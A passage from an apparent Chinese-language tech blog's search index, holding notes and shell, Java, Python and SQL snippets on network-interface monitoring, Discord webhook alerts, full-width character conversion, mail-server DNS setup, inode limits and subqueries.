down, trying to bring it up...\"</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> [ -e <span class=\"variable\">$FFLAG</span> ]</span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">                logger <span class=\"string\">\"<span class=\"variable\">$INTERFACE</span> is still down, REBOOT to recover ...\"</span></span><br><span class=\"line\">                rm -f <span class=\"variable\">$FFLAG</span> 2&gt;/dev/null</span><br><span class=\"line\">                sudo reboot</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                touch <span class=\"variable\">$FFLAG</span></span><br><span class=\"line\">                logger $(sudo <span class=\"variable\">$IFDOWN</span> <span class=\"variable\">$INTERFACE</span>)</span><br><span class=\"line\">                sleep 10</span><br><span class=\"line\">                logger $(sudo <span class=\"variable\">$IFUP</span> <span class=\"variable\">$INTERFACE</span>)</span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"><span class=\"comment\">#    logger \"$INTERFACE is up\"</span></span><br><span class=\"line\">    rm -f <span class=\"variable\">$FFLAG</span> 2&gt;/dev/null</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>但我不想重開機<br>之後找時間改寫</p>\n<h3 id=\"改成監控紀錄-log\"><a href=\"#改成監控紀錄-log\" class=\"headerlink\" title=\"改成監控紀錄 log\"></a>改成監控紀錄 log</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># cron script for checking wlan connectivity</span></span><br><span class=\"line\">IP_FOR_TEST=<span class=\"string\">\"192.168.1.1\"</span></span><br><span class=\"line\">PING_COUNT=1</span><br><span class=\"line\"></span><br><span class=\"line\">PING=<span class=\"string\">\"/bin/ping\"</span></span><br><span class=\"line\">INTERFACE=<span class=\"string\">\"eth0\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ping test</span></span><br><span class=\"line\"><span class=\"variable\">$PING</span> -c <span class=\"variable\">$PING_COUNT</span> <span class=\"variable\">$IP_FOR_TEST</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ $? -ge 1 ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"=============================\"</span></span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"<span class=\"variable\">$INTERFACE</span> seems to be down, trying to bring it up...\"</span></span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"carrier:\"</span></span><br><span class=\"line\">    cat /sys/class/net/eth0/carrier | logger -it check_interface</span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"operstate:\"</span></span><br><span class=\"line\">    cat /sys/class/net/eth0/operstate | logger -it check_interface</span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"route -n\"</span></span><br><span class=\"line\">    route -n 2&gt;&amp;1 | logger -it check_interface</span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"ifconfig:\"</span></span><br><span class=\"line\">    ifconfig 2&gt;&amp;1 | logger -it check_interface</span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"ping:\"</span></span><br><span class=\"line\">    ping -c4 192.168.1.1 | logger -it check_interface</span><br><span class=\"line\">    ping -c4 8.8.8.8 | logger -it check_interface</span><br><span class=\"line\">    logger -it check_interface <span class=\"string\">\"=============================\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>紀錄 log<br><a href=\"https://blog.csdn.net/u011630575/article/details/52055116\" target=\"_blank\" rel=\"noopener\">linux日志logger命令详解_飘过的春风-CSDN博客_linux logger</a><br><a href=\"https://blog.longwin.com.tw/2011/11/linux-data-syslog-logger-2011/\" target=\"_blank\" rel=\"noopener\">Linux 如何將資料寫到 Syslog | Tsung’s Blog</a><br><a href=\"https://unix.stackexchange.com/questions/124455/linux-how-to-redirect-stdout-stderr-to-logger\" target=\"_blank\" rel=\"noopener\">shell - Linux : how to redirect stdout &amp; stderr to logger? - Unix &amp; Linux Stack Exchange</a></p>\n<p>相關 interface 資訊<br><a href=\"http://rainstingtw.blogspot.com/2014/08/how-to-detect-ethernet-connected-state.html\" target=\"_blank\" rel=\"noopener\">如何在 Linux Kernel 下偵測網路的連線狀態？</a><br><a href=\"https://bbs.csdn.net/topics/390495032\" target=\"_blank\" rel=\"noopener\">wifi连接中operstate和carrier分别是什么作用？-CSDN论坛</a><br><a href=\"https://ubuntuqa.com/zh-tw/article/7995.html\" target=\"_blank\" rel=\"noopener\">在Linux上，如何檢測物理電纜是否已連接到網卡插槽 - Ubuntu問答</a><br><a href=\"https://blog.beanbang.cn/2019/05/17/raspberry-diary-02-network-configure/\" target=\"_blank\" rel=\"noopener\">树莓派折腾日记 二：网络相关配置 | 冰棒实验室</a></p>\n<h2 id=\"監控電腦活著發送-DISCORD-通知\"><a href=\"#監控電腦活著發送-DISCORD-通知\" class=\"headerlink\" title=\"監控電腦活著發送 DISCORD 通知\"></a>監控電腦活著發送 DISCORD 通知</h2><p>其他機都非常穩定<br>別台監控狀態</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">PING=<span class=\"string\">\"/bin/ping\"</span></span><br><span class=\"line\">PING_COUNT=1</span><br><span class=\"line\"></span><br><span class=\"line\">IP=(</span><br><span class=\"line\">192.168.1.1</span><br><span class=\"line\">192.168.1.2</span><br><span class=\"line\">192.168.1.3</span><br><span class=\"line\">)</span><br><span class=\"line\">DSCORD_WEBHOOK=<span class=\"string\">\"https://discordapp.com/api/webhooks/*\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">sendDiscordNotice</span></span>()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">local</span> MSG=<span class=\"variable\">$2</span></span><br><span class=\"line\">        <span class=\"comment\"># echo $MSG</span></span><br><span class=\"line\">        <span class=\"built_in\">local</span> URL=<span class=\"variable\">$1</span></span><br><span class=\"line\">        curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">        -X POST \\</span><br><span class=\"line\">        -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;MSG&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$URL</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sendDiscordNotice $DSCORD_WEBHOOK \"test\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$&#123;IP[@]&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"comment\">#echo $i</span></span><br><span class=\"line\">    MSG=<span class=\"string\">\"<span class=\"variable\">$&#123;i&#125;</span> 沒法 PING 到主機，請管理員查詢狀況\"</span></span><br><span class=\"line\">    <span class=\"comment\">#echo $MSG</span></span><br><span class=\"line\">    <span class=\"variable\">$PING</span> -c <span class=\"variable\">$PING_COUNT</span> <span class=\"variable\">$i</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ $? -ge 1 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        sendDiscordNotice <span class=\"string\">\"<span class=\"variable\">$&#123;DSCORD_WEBHOOK&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;MSG&#125;</span>\"</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>這邊學到shell function 參數是用 $1 $2<br>參數最後外面加個<code>&quot;</code>預防參考帶進去有問題</p>\n<p><a href=\"https://officeguide.cc/bash-tutorial-define-use-functions/\" target=\"_blank\" rel=\"noopener\">Bash 程式設計教學與範例：function 自訂函數 - Office 指南</a></p>\n<p>對 variable 使用 foeach</p>\n<p><a href=\"https://stackoverflow.com/questions/8880603/loop-through-an-array-of-strings-in-bash\" target=\"_blank\" rel=\"noopener\">Loop through an array of strings in Bash? - Stack Overflow</a></p>\n<h2 id=\"番外\"><a href=\"#番外\" class=\"headerlink\" title=\"番外\"></a>番外</h2><h3 id=\"開機做發信動作\"><a href=\"#開機做發信動作\" class=\"headerlink\" title=\"開機做發信動作\"></a>開機做發信動作</h3><p><a href=\"https://www.pupuliao.info/2013/06/ubuntu-server-%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E7%99%BC%E4%BF%A1%E9%80%9A%E7%9F%A5%E4%BD%BF%E7%94%A8gmail/\" target=\"_blank\" rel=\"noopener\">ubuntu server 開機自動發信通知(使用gmail) | pupuliao的部落格</a></p>\n<p>決得這邊沒有考慮到網路的問題<br>但這個方法也滿有用的<br>先記錄</p>\n<p>### </p>\n","categories":["Linux"],"tags":["raspberry","discord"]},{"title":"神奇的選擇器 :focus-within","url":"/blog/2019/02/28/%E7%A5%9E%E5%A5%87%E7%9A%84%E9%81%B8%E6%93%87%E5%99%A8-focus-within/","content":"<p>這篇簡單記錄<code>focus-within</code><br>簡單記錄一下這邊<br>主要會監聽子層 focus，子層會冒泡給上層<br>上層會觸發 focus-within<br>簡單玩一下會比較了解<a href=\"https://jsbin.com/yozesawato/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">JS Bin - JS Bin</a></p>\n<p>更多內容可以看 <a href=\"http://web.jobbole.com/95025/\" target=\"_blank\" rel=\"noopener\">神奇的選擇器 :focus-within - WEB 前端 - 伯樂在線</a></p>\n","categories":["CSS"],"tags":["css"]},{"title":"程式半型轉全型方法","url":"/blog/2021/03/08/%E7%A8%8B%E5%BC%8F%E5%8D%8A%E5%9E%8B%E8%BD%89%E5%85%A8%E5%9E%8B%E6%96%B9%E6%B3%95/","content":"<p>Keep Learning…</p>\n<a id=\"more\"></a>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String []args)</span></span>&#123;</span><br><span class=\"line\">        System.out.println(halfWidth2FullWidth(<span class=\"string\">\"Hello World!!!@\"</span>));</span><br><span class=\"line\">        System.out.println(fullWidth2halfWidth(<span class=\"string\">\"Ｈｅｌｌｏ　Ｗｏｒｌｄ！！！＠\"</span>));</span><br><span class=\"line\">        System.out.println(halfWidth2FullWidth(<span class=\"string\">\"Hello World!!!@中文測試\"</span>));</span><br><span class=\"line\">        System.out.println(fullWidth2halfWidth(<span class=\"string\">\"中文測試Ｈｅｌｌｏ　Ｗｏｒｌｄ！！！＠\"</span>));</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Full-angle string conversion half-corner string</span></span><br><span class=\"line\"><span class=\"comment\"> * 1, half-width characters are starting from 33 to 126 end</span></span><br><span class=\"line\"><span class=\"comment\"> * 2, the full-width character corresponding to the half-width character is from 65281 start to 65374 end</span></span><br><span class=\"line\"><span class=\"comment\"> * 3, the half corner of the space is 32. The corresponding Full-width space is 12288</span></span><br><span class=\"line\"><span class=\"comment\"> * The relationship between Half-width and Full-width is obvious, except that the character offset is 65248 (65281-33 = 65248).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> fullWidthStr Non-empty full-width string</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> Half-angle string</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span>  String <span class=\"title\">halfWidth2FullWidth</span><span class=\"params\">(String fullWidthStr)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">null</span> == fullWidthStr || fullWidthStr.length() &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>[] arr = fullWidthStr.toCharArray();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> charValue = (<span class=\"keyword\">int</span>) arr[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (charValue &gt;= <span class=\"number\">33</span> &amp;&amp; charValue &lt;= <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">            arr[i] = (<span class=\"keyword\">char</span>) (charValue + <span class=\"number\">65248</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (charValue == <span class=\"number\">32</span>) &#123;</span><br><span class=\"line\">            arr[i] = (<span class=\"keyword\">char</span>) <span class=\"number\">12288</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> String(arr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">fullWidth2halfWidth</span><span class=\"params\">(String fullWidthStr)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">null</span> == fullWidthStr || fullWidthStr.length() &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">char</span>[] charArray = fullWidthStr.toCharArray();</span><br><span class=\"line\">        <span class=\"comment\">//對全形字元轉換的char陣列遍歷</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; charArray.length; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> charIntValue = (<span class=\"keyword\">int</span>) charArray[i];</span><br><span class=\"line\">            <span class=\"comment\">//如果符合轉換關係,將對應下標之間減掉偏移量65248;如果是空格的話,直接做轉換</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (charIntValue &gt;= <span class=\"number\">65281</span> &amp;&amp; charIntValue &lt;= <span class=\"number\">65374</span>) &#123;</span><br><span class=\"line\">                charArray[i] = (<span class=\"keyword\">char</span>) (charIntValue - <span class=\"number\">65248</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (charIntValue == <span class=\"number\">12288</span>) &#123;</span><br><span class=\"line\">                charArray[i] = (<span class=\"keyword\">char</span>) <span class=\"number\">32</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> String(charArray);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://blog.xuite.net/chocopie0226/programer/64402547\" target=\"_blank\" rel=\"noopener\">javascript-半形字串轉全形 @ 程式設計 - 網頁 :: 隨意窩 Xuite日誌</a></li>\n<li><a href=\"https://stackoverflow.com/questions/13559050/how-to-know-half-width-or-full-width-character\" target=\"_blank\" rel=\"noopener\">java - How to know half-width or full-width character? - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/32303509/how-to-convert-from-full-width-to-half-width-japanese-characters-in-java\" target=\"_blank\" rel=\"noopener\">encoding - How to convert from full-width to half-width Japanese characters in Java? - Stack Overflow</a></li>\n</ul>\n","categories":["Java"]},{"title":"程式發信 mail 的問題整理","url":"/blog/2020/10/28/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/","content":"<p>先蒐集，有空整理</p>\n<a id=\"more\"></a>\n<h2 id=\"發信指令\"><a href=\"#發信指令\" class=\"headerlink\" title=\"發信指令\"></a>發信指令</h2><p><a href=\"https://blog.edmdesigner.com/send-email-from-linux-command-line/\" target=\"_blank\" rel=\"noopener\">16 Command Examples to Send Email From The Linux Command Line</a></p>\n<h2 id=\"relay-access-denied\"><a href=\"#relay-access-denied\" class=\"headerlink\" title=\"relay access denied\"></a>relay access denied</h2><p><a href=\"https://ithelp.ithome.com.tw/questions/10069903\" target=\"_blank\" rel=\"noopener\">Postfix - Relay access denied - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p><a href=\"https://mlwmlw.org/2010/09/postfix-relay-access-denied/\" target=\"_blank\" rel=\"noopener\">postfix relay access denied – 阿喵就像家</a></p>\n<p>Mail Server 設定對應 IP 就可以發信出去了</p>\n<h2 id=\"黑名單\"><a href=\"#黑名單\" class=\"headerlink\" title=\"黑名單\"></a>黑名單</h2><p><a href=\"https://www.dnsbl.info/dnsbl-database-check.php\" target=\"_blank\" rel=\"noopener\">DNSBL Information - Spam Database Lookup</a></p>\n<p><a href=\"https://www.spamhaus.org/lookup/\" target=\"_blank\" rel=\"noopener\">Blocklist Removal Center - The Spamhaus Project</a></p>\n<h2 id=\"解決方案\"><a href=\"#解決方案\" class=\"headerlink\" title=\"解決方案\"></a>解決方案</h2><ol>\n<li>更換 Mail Server 主機 IP (workaround?)</li>\n<li>DNS Server 設定MX</li>\n<li>設定SPF</li>\n<li>設定 DomainKey（DKIM）</li>\n<li>設定 DMARC</li>\n<li>開通25 Port</li>\n</ol>\n<h2 id=\"建製-mail-注意的事情\"><a href=\"#建製-mail-注意的事情\" class=\"headerlink\" title=\"建製 mail 注意的事情\"></a>建製 mail 注意的事情</h2><ol>\n<li>整理發信來源IP</li>\n<li>調整DNS，A、PTR、MX、TXT record、DKIM</li>\n<li>向各Email服務商提出申請</li>\n<li>發信機主機名稱</li>\n<li>LOG解析</li>\n</ol>\n<h2 id=\"相關DNS-Resource\"><a href=\"#相關DNS-Resource\" class=\"headerlink\" title=\"相關DNS Resource\"></a>相關DNS Resource</h2><p>調整DNS<br>A：正解<br>PTR：反解<br>MX：郵件交換紀錄<br>TXT record：SPF<br>DKIM</p>\n<p>MX：讓DNS能正常解析<br>SPF：是一套電子郵件驗證機制，可指定哪些郵件伺服器有權為您的網域傳送電子郵件。<br>DKIM：會為每一封郵件加上數位簽名，幫助收件伺服器確認郵件並非偽造，而且在傳輸過程中未遭到竄改。</p>\n<p>詳細: </p>\n<ul>\n<li><a href=\"http://dns-learning.twnic.net.tw/bind/intro6.html\" target=\"_blank\" rel=\"noopener\">DNS資源紀錄(Resource Record)介紹</a></li>\n<li><a href=\"http://linux.vbird.org/linux_server/0350dns.php\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – DNS Server</a></li>\n</ul>\n<p>nslookup<br>A記錄(正解)\u000bset q=a<br>ptr記錄(反解)\u000bset q=ptr<br>MX記錄(郵件交換記錄)\u000bset q=mx<br>TXT記錄(文字記錄)\u000bset q=txt</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p><a href=\"https://www.nslookuptool.com/cht/\" target=\"_blank\" rel=\"noopener\">DNS傳播檢查 - Nslookup Tool</a></p>\n<h2 id=\"相關名稱意思\"><a href=\"#相關名稱意思\" class=\"headerlink\" title=\"相關名稱意思\"></a>相關名稱意思</h2><p><a href=\"https://www.huangzhong.ca/zh/rokso-sbl-xbl-pbl-dbl/\" target=\"_blank\" rel=\"noopener\">ROKSO、SBL、XBL、PBL、DBL 是什么意思？ – 黄忠 – 博客</a></p>\n","categories":["Linux"],"tags":["linux"]},{"title":"簡單使用shell做個硬碟空間警告discord通知","url":"/blog/2019/03/21/%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8shell%E5%81%9A%E5%80%8B%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93%E8%AD%A6%E5%91%8Adiscord%E9%80%9A%E7%9F%A5/","content":"<p>最近研究出來 discord webhook<br>想說讓我的動物機玩玩<br>但是動物機只有裝 python<br>也沒看到 monolog for discord<br><del>不想自幹</del>因為我不熟 python<br>原本想說使用看看 nodejs<br>不過想說用原生 shell 看看<br>不用安裝環境</p>\n<a id=\"more\"></a>\n<p>隨便 google 爬了一個範例<a href=\"https://www.cyberciti.biz/tips/shell-script-to-watch-the-disk-space.html\" target=\"_blank\" rel=\"noopener\">Shell script to watch the disk space - nixCraft</a><br>因為有語系關係，所以有調整程式碼</p>\n<blockquote>\n<p>踩雷注意!!!<br>xxx(string): not found<br>shell =前後盡量不要有空白</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">df -H | grep -vE <span class=\"string\">'^Filesystem|tmpfs|cdrom|udev|已用'</span> | awk <span class=\"string\">'&#123; print $5 \" \" $1 &#125;'</span> | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> output;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"variable\">$output</span></span><br><span class=\"line\">  usep=$(<span class=\"built_in\">echo</span> <span class=\"variable\">$output</span> | awk <span class=\"string\">'&#123; print $1&#125;'</span> | cut -d<span class=\"string\">'%'</span> -f1  )</span><br><span class=\"line\">  partition=$(<span class=\"built_in\">echo</span> <span class=\"variable\">$output</span> | awk <span class=\"string\">'&#123; print $2 &#125;'</span> )</span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$usep</span> -ge 80 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    msg=<span class=\"string\">\"注意快超出硬碟空間\\\\\\\"<span class=\"variable\">$partition</span>\\\\\\\" (<span class=\"variable\">$usep</span>%) on <span class=\"variable\">$(hostname)</span> as on <span class=\"variable\">$(date)</span>\"</span></span><br><span class=\"line\">    url=<span class=\"string\">'https://discordapp.com/api/webhooks/*'</span></span><br><span class=\"line\">    curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">    -X POST \\</span><br><span class=\"line\">    -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;msg&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$url</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>剩下就是設定一下排程</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">0 18 * * * sh /root/notify/disk.sh &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>任務完成!!</p>\n<p>備注:<br>Discord Webhook 可以參考這篇下面<a href=\"https://malagege.github.io/blog/2019/03/19/%E4%BD%BF%E7%94%A8monolog%E5%92%8Cslack-%E5%81%9Awebhook%E5%B0%8F%E8%A8%98/\">使用 monolog 和 slack 做 webhook 小記 | 程式狂想筆記</a><br>記得上面 code 要把網址換掉</p>\n","categories":["Linux"],"tags":["linux"]},{"title":"系統上檔案數量限制","url":"/blog/2021/06/02/%E7%B3%BB%E7%B5%B1%E4%B8%8A%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F%E9%99%90%E5%88%B6/","content":"<p>inode 有限制檔案數量<br>刪除沒用到的檔案<br><a id=\"more\"></a></p>\n<p><a href=\"https://a42033.gitbooks.io/linux-/content/linux/information/file_number.html\" target=\"_blank\" rel=\"noopener\">檔案數量限制 · Linux學習筆記</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python2</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> xrange(<span class=\"number\">0</span>,<span class=\"number\">1000000000</span>):</span><br><span class=\"line\">  f=open(str(x),<span class=\"string\">'a'</span>)</span><br><span class=\"line\">  f.close()</span><br></pre></td></tr></table></figure>\n<p>64000 看起來是指子資料夾限制</p>\n<blockquote>\n<p>It depends on the file system. ext3 suppport ~32000 subdirectories (not files!) in a given directory, with ext4 it’s 64000 by default. xfs has no limit to my knowledge.</p>\n</blockquote>\n<p><a href=\"https://serverfault.com/questions/506465/is-there-a-hard-limit-to-the-number-of-files-a-directory-can-have\" target=\"_blank\" rel=\"noopener\">linux - Is there a hard limit to the number of files a directory can have? - Server Fault</a></p>\n<p><a href=\"https://help.aliyun.com/knowledge_detail/42531.html\" target=\"_blank\" rel=\"noopener\">Linux实例磁盘空间满和inode满的问题排查方法 - 阿里云</a></p>\n<p><a href=\"https://blog.xuite.net/chingwei/blog/32921084\" target=\"_blank\" rel=\"noopener\">【程式】Shell Script : 顯示某資料匣下的 inode 數量 (檔案數) @ My Life :: 隨意窩 Xuite日誌</a></p>\n<p><a href=\"https://blog.longwin.com.tw/2016/12/linux-delete-many-files-quick-2016/\" target=\"_blank\" rel=\"noopener\">Linux 快速清除「檔案數量太多」的速度比較 – Tsung’s Blog</a></p>\n<p><a href=\"https://snippetinfo.net/media/2528\" target=\"_blank\" rel=\"noopener\">inode 用光光了 | 老洪的 IT 學習系統</a></p>\n<p><a href=\"https://pttdigits.com/Linux/1GMMS1Dz\" target=\"_blank\" rel=\"noopener\">[問題] XFS檔案系統，刪除檔案沒有釋放空間。 - 看板Linux | PTT數位生活區</a></p>\n<p><a href=\"https://www.cnblogs.com/diantong/p/10512696.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/diantong/p/10512696.html</a></p>\n<p><a href=\"http://www.unixlinux.online/unixlinux/linuxgl/linuxwh/201703/74599.html\" target=\"_blank\" rel=\"noopener\">Linux下使用xfs時提示沒有磁盤空間的情況該如何處理_Linux維護</a></p>\n<p><a href=\"https://lostwa.com/2020/troubleshoting_the_missing_disk_space.html\" target=\"_blank\" rel=\"noopener\">lostwa.com - 一次 XFS 文件系统碎片导致的空间异常</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/172107061\" target=\"_blank\" rel=\"noopener\">Linux磁盘空间怎么释放？ - 知乎</a></p>\n","categories":["Linux"],"tags":["linux"]},{"title":"終於知道為什麼子查詢沒辦法抓取外面的表","url":"/blog/2018/12/24/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/","content":"<p>今天終於找到我以前下子查詢沒辦法抓到外面的表原因</p>\n<blockquote>\n<p>這兩個其實不難分，不要被兩個專有名詞嚇到<br>先講非相關子查詢，簡單講就是子查詢跟外面 SQL 查詢內容沒有相關<br>非相關子查詢只會跑一次，所以效能上會非常快<br>執行順序也比外層先，所以這也是為什麼非相關子查詢沒法取得外層欄位的原因</p>\n</blockquote>\n<p><a href=\"https://malagege.github.io/blog/2017/12/23/logdown/2017-12-23-sql-subquery-notes/\">SQL 子查詢筆記(相關子查詢/非相關子查詢) | 程式狂想筆記</a></p>\n<a id=\"more\"></a>\n<h2 id=\"其實子查詢-JOIN-沒辦法抓到外面的表\"><a href=\"#其實子查詢-JOIN-沒辦法抓到外面的表\" class=\"headerlink\" title=\"其實子查詢 JOIN 沒辦法抓到外面的表\"></a>其實子查詢 JOIN 沒辦法抓到外面的表</h2><img src=\"/blog/2018/12/24/終於知道為什麼子查詢沒辦法抓取外面的表/1.png\" title=\"放在join不能查詢\">\n<p>放在 select 跟 where 都可以查</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> (</span><br><span class=\"line\">    <span class=\"keyword\">SELECT</span> b.uid</span><br><span class=\"line\">    <span class=\"keyword\">FROM</span> <span class=\"string\">`xxxxxxxx`</span> b</span><br><span class=\"line\">    <span class=\"keyword\">where</span> b.<span class=\"string\">`date`</span> = a.<span class=\"string\">`date`</span> <span class=\"keyword\">and</span> b.uid  = a.uid</span><br><span class=\"line\">) <span class=\"keyword\">as</span> a</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> <span class=\"string\">`xxxxxxxx`</span> a</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"string\">`date`</span> = <span class=\"string\">'2017-12-01'</span> <span class=\"keyword\">and</span> uid  = <span class=\"string\">'2239124893975610'</span></span><br></pre></td></tr></table></figure>\n<p>之前也有寫過這篇<br><a href=\"https://malagege.github.io/blog/2017/07/13/logdown/2017-07-13-2043738/\">SQL ON /WHERE 差別 | 程式狂想筆記</a></p>\n<p>希望以後寫子查詢可以順順利利</p>\n","categories":["MySQL"],"tags":["mysql","sql","子查詢"]},{"title":"網站哀弔灰階 CSS 